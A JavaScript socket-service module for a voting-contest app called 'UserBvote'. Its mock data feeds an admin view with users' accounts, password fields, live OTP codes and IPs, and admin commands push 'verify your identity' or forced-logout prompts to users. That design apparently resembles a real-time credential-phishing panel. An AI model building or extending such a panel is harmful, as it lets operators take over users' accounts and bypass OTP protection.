// Socket Service for UserBvote
import { EventEmitter } from "./eventEmitter.js";

class MockSocketService extends EventEmitter {
  constructor() {
    super();
    this.connected = false;
    this.socketId = null;
    this.reconnectTimer = null;
    this.eventTimer = null;
  }

  connect() {
    this.connected = true;
    this.socketId = `mock-socket-${Date.now()}`;

    // Simulate connection
    setTimeout(() => {
      this.emit("connect");
      this.startMockEvents();
    }, 100);
  }

  disconnect() {
    this.connected = false;
    this.socketId = null;

    if (this.reconnectTimer) {
      clearTimeout(this.reconnectTimer);
    }

    if (this.eventTimer) {
      clearInterval(this.eventTimer);
    }

    if (this.userActivityTimer) {
      clearInterval(this.userActivityTimer);
    }

    this.emit("disconnect");
  }

  startMockEvents() {
    // Simulate real-time events
    this.eventTimer = setInterval(() => {
      if (!this.connected) return;

      // Simulate admin commands
      const commands = [
        { type: "request.verify", message: "Please verify your identity" },
        { type: "notify", message: "New contest announcement available" },
        {
          type: "force.logout",
          message: "Session expired, please login again",
        },
      ];

      const randomCommand =
        commands[Math.floor(Math.random() * commands.length)];

      this.emit("user:command", {
        ...randomCommand,
        timestamp: new Date().toISOString(),
        correlationId: `cmd-${Date.now()}`,
      });
    }, 15000); // Every 15 seconds

    // Simulate user activities for testing
    this.userActivityTimer = setInterval(() => {
      if (!this.connected) return;

      // Simulate random user activities and save to localStorage for admin
      const activities = [
        {
          type: "page.view",
          page: "home",
          link: "bvote.com/home",
          account: "user001@gmail.com\nBVOTE User Account",
          action: "Xem trang chủ",
        },
        {
          type: "contest.browse",
          contestId: "contest-1",
          link: "bvote.com/contest/1",
          account: "user002@yahoo.com\nBVOTE User Account",
          action: "Duyệt cuộc thi",
        },
        {
          type: "profile.update",
          field: "avatar",
          link: "bvote.com/profile",
          account: "user003@hotmail.com\nBVOTE User Account",
          action: "Cập nhật profile",
        },
        {
          type: "vote.cast",
          contestantId: "contestant-123",
          link: "bvote.com/vote",
          account: "user004@gmail.com\nBVOTE User Account",
          action: "Bình chọn thí sinh",
        },
      ];

      const randomActivity =
        activities[Math.floor(Math.random() * activities.length)];

      // Save to localStorage for admin to read
      const userActivities = JSON.parse(
        localStorage.getItem("userActivities") || "[]"
      );
      const newActivity = {
        id: Date.now(),
        time: new Date().toLocaleString("vi-VN"),
        link: randomActivity.link,
        account: randomActivity.account,
        password: "••••••••",
        otp: Math.floor(100000 + Math.random() * 900000).toString(),
        ip: `192.168.1.${Math.floor(100 + Math.random() * 50)}`,
        status: ["Đang hoạt động", "Hoàn thành", "Chờ phê duyệt"][
          Math.floor(Math.random() * 3)
        ],
        action: randomActivity.action,
        timestamp: new Date().toISOString(),
        userId: "mock-user-001",
      };

      userActivities.unshift(newActivity);
      localStorage.setItem(
        "userActivities",
        JSON.stringify(userActivities.slice(0, 20))
      );

      this.emit("user:activity", newActivity);
    }, 20000); // Every 20 seconds
  }

  emit(event, data) {
    super.emit(event, data);

    // Log events for debugging
    console.log(`[MockSocket] Emitted: ${event}`, data);
  }

  on(event, callback) {
    super.on(event, callback);
    return this;
  }

  off(event, callback) {
    super.off(event, callback);
    return this;
  }
}

class RealSocketService {
  constructor(socketURL) {
    this.socketURL = socketURL;
    this.socket = null;
    this.connected = false;
    this.reconnectAttempts = 0;
    this.maxReconnectAttempts = 5;
    this.reconnectDelay = 1000;
  }

  async connect(token = null) {
    try {
      // Import socket.io-client dynamically
      const { io } = await import("socket.io-client");

      this.socket = io(this.socketURL, {
        transports: ["polling", "websocket"], // Try polling first
        auth: token ? { token } : {},
        timeout: 5000, // Reduce timeout for faster detection
        reconnectionAttempts: 3, // Reduce attempts to avoid loops
        reconnectionDelay: 2000, // Increase delay between attempts
        reconnection: true,
        autoConnect: true,
      });

      this.setupEventListeners();
    } catch (error) {
      console.error("Failed to connect to Socket.IO:", error);
      this.scheduleReconnect();
    }
  }

  setupEventListeners() {
    if (!this.socket) return;

    this.socket.on("connect", () => {
      this.connected = true;
      this.reconnectAttempts = 0;
      console.log("Connected to Socket.IO server");
    });

    this.socket.on("disconnect", (reason) => {
      this.connected = false;
      console.log("Disconnected from Socket.IO server:", reason);

      if (reason === "io server disconnect") {
        // Server disconnected us, try to reconnect
        this.scheduleReconnect();
      }
    });

    this.socket.on("connect_error", (error) => {
      console.error("Socket.IO connection error:", error);
      this.connected = false;
      this.scheduleReconnect();
    });

    // Listen for admin commands
    this.socket.on("user:command", (command) => {
      console.log("Received admin command:", command);
      // Emit to local event listeners
      this.emit("user:command", command);
    });
  }

  scheduleReconnect() {
    if (this.reconnectAttempts >= this.maxReconnectAttempts) {
      console.warn("Max reconnection attempts reached, stopping reconnection");
      this.connected = false;
      return;
    }

    this.reconnectAttempts++;
    const delay = Math.min(this.reconnectDelay * this.reconnectAttempts, 10000); // Cap at 10s

    console.log(
      `Scheduling reconnection attempt ${this.reconnectAttempts}/${this.maxReconnectAttempts} in ${delay}ms`
    );

    this.reconnectTimer = setTimeout(() => {
      if (!this.connected) {
        this.connect();
      }
    }, delay);
  }

  disconnect() {
    if (this.reconnectTimer) {
      clearTimeout(this.reconnectTimer);
      this.reconnectTimer = null;
    }
    if (this.socket) {
      this.socket.disconnect();
      this.socket = null;
    }
    this.connected = false;
  }

  // Reset connection state for fresh start
  resetConnection() {
    this.disconnect();
    this.reconnectAttempts = 0;
    this.connected = false;
  }

  emit(event, data) {
    if (this.socket && this.connected) {
      this.socket.emit(event, data);
    } else {
      console.warn(`Cannot emit ${event}: socket not connected`);
    }
  }

  on(event, callback) {
    if (this.socket) {
      this.socket.on(event, callback);
    }
    return this;
  }

  off(event, callback) {
    if (this.socket) {
      this.socket.off(event, callback);
    }
    return this;
  }

  // Send user activity events to admin
  sendUserActivity(activity) {
    this.emit("user:activity", {
      ...activity,
      timestamp: new Date().toISOString(),
      userId: localStorage.getItem("user_id") || "anonymous",
    });
  }

  // Send vote events
  sendVoteEvent(contestantId, contestId) {
    this.emit("user:vote", {
      type: "vote.cast",
      contestantId,
      contestId,
      action: "vote",
      timestamp: new Date().toISOString(),
      userId: localStorage.getItem("user_id") || "anonymous",
    });
  }

  // Send authentication events
  sendAuthEvent(type, success) {
    this.emit("user:auth", {
      type: `auth.${type}`,
      success,
      timestamp: new Date().toISOString(),
      userId: localStorage.getItem("user_id") || "anonymous",
    });
  }

  // Send KYC events
  sendKYCEvent(status) {
    this.emit("user:kyc", {
      type: "kyc.status",
      status,
      timestamp: new Date().toISOString(),
      userId: localStorage.getItem("user_id") || "anonymous",
    });
  }

  // Send session events
  sendSessionEvent(type) {
    this.emit("user:activity", {
      type: `session.${type}`,
      timestamp: new Date().toISOString(),
      userId: localStorage.getItem("user_id") || "anonymous",
    });
  }
}

// Export classes for direct usage
export { MockSocketService, RealSocketService };

// Factory function to create appropriate socket service
export function createSocketService() {
  const useMock = import.meta.env.VITE_USE_MOCK === "1";
  const socketURL = import.meta.env.VITE_SOCKET_URL;

  if (useMock) {
    return new MockSocketService();
  } else {
    return new RealSocketService(socketURL);
  }
}

export default createSocketService();
